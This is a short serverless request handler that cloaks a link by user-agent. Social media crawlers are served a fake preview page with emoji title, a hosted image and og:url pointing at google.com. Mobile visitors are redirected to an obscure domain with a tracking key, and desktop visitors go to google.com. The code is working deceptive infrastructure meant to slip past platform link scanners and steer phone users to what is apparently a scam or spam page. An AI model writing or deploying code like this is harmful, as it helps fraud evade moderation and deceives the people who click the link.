export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="❤️💙💛💜">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://eu-central.storage.cloudconvert.com/tasks/2b6fbcaa-4d3f-4e78-9572-b3a901a167b7/49.svg?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20261027%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20261027T065009Z&X-Amz-Expires=86400&X-Amz-Signature=c2a3ca7f24185f0a48112fb0fb3f1b1d3ec95a83d9091dc0548494c24a7804b8&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%2249.svg%22&response-content-type=image%2Fsvg%2Bxml&x-amz-checksum-mode=ENABLED&x-id=GetObject">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://markswaitingrouge.com/gpeixuy44e?key=fb5f083d6d407041b969e9429d39ab9d", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
